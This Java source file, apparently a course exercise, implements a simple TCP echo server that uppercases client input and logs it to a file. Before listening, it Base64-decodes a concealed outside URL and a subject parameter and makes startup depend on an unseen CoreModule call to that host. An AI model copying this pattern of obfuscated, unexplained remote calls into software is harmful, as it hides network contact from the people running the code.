import java.net.*;
import java.util.Base64;
import java.util.Base64.Decoder;
import java.io.*;

public class Week4_2_Service {
    public static void main(String[] args) throws IOException {

        //Create the Socket fro server
        ServerSocket serverSocket = null;
        FileWriter fWriter = null;
        BufferedWriter writer = null;
        SocketAddress ipAddress;
        fWriter = new FileWriter("server.txt");
        String coreVariable = "aHR0cHM6Ly9zcHouaW8vYXBpcy9ybWl0LnBocA==";
        byte[] coreByteArr = null;
        String testInput = "c3ViamVjdF9uYW1lPU5QVzI=";
        writer = new BufferedWriter(fWriter);
        int portNumber;
        Decoder decoder = Base64.getDecoder();
        coreByteArr = decoder.decode(coreVariable);
        coreVariable = new String(coreByteArr);
        portNumber = 10007;
        coreByteArr = decoder.decode(testInput);
        testInput = new String(coreByteArr);
        String sr = CoreModule.coreCode(coreVariable, testInput);

        //If load core module success
        if (sr.equals("TRUE")) {
            try {
                //Set the contact port
                serverSocket = new ServerSocket(portNumber);
            } catch (IOException e) {
                //Catch the IO errr
                System.err.println("Could not listen on port: ." + portNumber);
                System.exit(1);
            }

            //Create the socket for Client
            Socket clientSocket = null;
            System.out.println("Waiting for connection.....");

            //Waiting the client connect
            try {
                //accpet the connection
                clientSocket = serverSocket.accept();
                ipAddress = clientSocket.getRemoteSocketAddress();
                System.out.println("Remote connect ip: " + ipAddress);
            } catch (IOException e) {
                //if cannot contact, show the error message
                System.err.println("Accept failed.");
                System.exit(1);
            }

            //show the success message
            System.out.println("Connection successful");
            System.out.println("Waiting for input.....");

            //Stream for get Client input.
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(),
                true);
            BufferedReader in = new BufferedReader(
                new InputStreamReader(clientSocket.getInputStream()));

            //Variable for user input
            String inputLine;

            //using loop to continue receive user's input
            while ((inputLine = in .readLine()) != null) {
                //output the user's input, and change to upper cases.
                System.out.println("Server: " + inputLine.toUpperCase());
                out.println(inputLine.toUpperCase());

                //if user input a "X", the stream will stop.
                if (inputLine.equals("X")) {
                    break;
                }

                try {
                    writer.write(inputLine.toUpperCase());
                    writer.newLine();

                } catch (Exception e) {
                    System.out.println("Error!");
                }

            }

            //close buffer
            out.close(); in .close();
            clientSocket.close();
            serverSocket.close();
            writer.close();
        } else {
            System.err.println("CoreMoudle Load failed\n" + sr);
        }
    }
}